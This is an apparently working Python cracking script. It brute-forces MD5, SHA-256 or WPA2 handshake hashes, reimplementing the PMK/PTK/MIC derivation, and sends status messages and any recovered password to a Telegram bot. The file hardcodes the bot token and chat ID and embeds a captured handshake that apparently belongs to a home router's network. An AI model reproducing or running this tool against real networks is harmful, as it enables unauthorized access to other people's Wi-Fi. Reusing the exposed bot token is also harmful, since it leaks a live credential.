
import hashlib ,hmac
import requests
botKey='6852521025:AAGy-21aK_AQfF2zOcmu-XNqB71X4VdPbQg'
chatId='1601284205'

def sendmsg(msg):
    url = f"https://api.telegram.org/bot{botKey}/sendMessage?chat_id={chatId}&text={msg}"
    requests.get(url)
msg='start hash'
sendmsg(msg)
def wpa(cap, passw):
    hl = cap.split("*")
    mic = bytes.fromhex(hl[2])
    mac_ap = bytes.fromhex(hl[3])
    mac_cl = bytes.fromhex(hl[4])
    essid = bytes.fromhex(hl[5])
    nonce_ap = bytes.fromhex(hl[6])
    nonce_cl = bytes.fromhex(hl[7][34:98])
    eapol_client = bytes.fromhex(hl[7])

    def passwpa(password):
        def min_max(a, b):
            if len(a) != len(b):
                raise ValueError('Unequal byte string lengths')
            for entry in zip(bytes(a), bytes(b)):
                if entry[0] < entry[1]:
                    return a, b
                elif entry[1] < entry[0]:
                    return b, a
            return a, b

        macs = min_max(mac_ap, mac_cl)
        nonces = min_max(nonce_ap, nonce_cl)
        ptk_inputs = b''.join([b'Pairwise key expansion\x00',
                               macs[0], macs[1], nonces[0], nonces[1], b'\x00'])
        password = password.encode()
        pmk = hashlib.pbkdf2_hmac('sha1', password, essid, 4096, 32)
        ptk = hmac.new(pmk, ptk_inputs, hashlib.sha1).digest()
        try_mic = hmac.new(ptk[:16], eapol_client, hashlib.sha1).digest()[:16]
        return try_mic, mic

    return passwpa(passw)


text = ('QWERTYUIOPASDFGHJKLZXCVBNM123456789')
min_num = int((18))
max_num = int((18))
hash_type = ('3')
target_hash = ('''WPA*02*3703366142029bf6e3d79693addf848c*bcf88b629154*38beabb4101c*4c615f46696272655f644f72616e67655f322e34475f39313534*5a659a98d0689055ea0ab1c6065fca19707a84436696d0be4e1034c9200cfc3b*0103007502010a00000000000000000001fa932e88e2d54f3f3bf3cd5a222689f95d14ec2c1f2507167bfdd65ebad2e2b6000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020000*02Zz''')
sendmsg(text)
output_text = list(text)
result = 0

for numb in range(min_num, max_num + 1):
    result += len(output_text) ** numb
if hash_type == '1':
    hash_algorithm = hashlib.md5
elif hash_type == '2':
    hash_algorithm = hashlib.sha256
elif hash_type=='3':
    a = wpa(target_hash, '')
    print (a[0]==a[1])
    hash_algorithm=wpa


else:
    print('Invalid hash type. Exiting.')
    exit()


def calculate_hash(word, hash_algorithm):
    hash_object = hash_algorithm()
    hash_object.update(word.encode('utf-8'))
    hashed_string = hash_object.hexdigest()
    return hashed_string

def generate_words(characters, hash_algorithm, num, current_word="", index=0):
    hashed_word = None  # Define a default value

    if index == num:
        if hash_type == '1' or hash_type == '2':
            hashed_word = calculate_hash(current_word, hash_algorithm)
        print(current_word, hashed_word)
        if hashed_word == target_hash:
            print(f'Your password is {current_word}')
            return True
        elif hash_type == '3':
            a = wpa(target_hash, current_word)
            if a[0] == a[1]:
                sendmsg(f'Your password is {current_word}')
                print(f'Your password is {current_word}')
                return True
        return False

    for char in characters:
        if generate_words(characters, hash_algorithm, num, current_word + char, index + 1):
            return True

    return False




print(f"Length for your wordlist is: {result}")

password_found = False

for num in range(min_num, max_num + 1):
    password_found = generate_words(output_text, hash_algorithm, num)
    if password_found:
        break
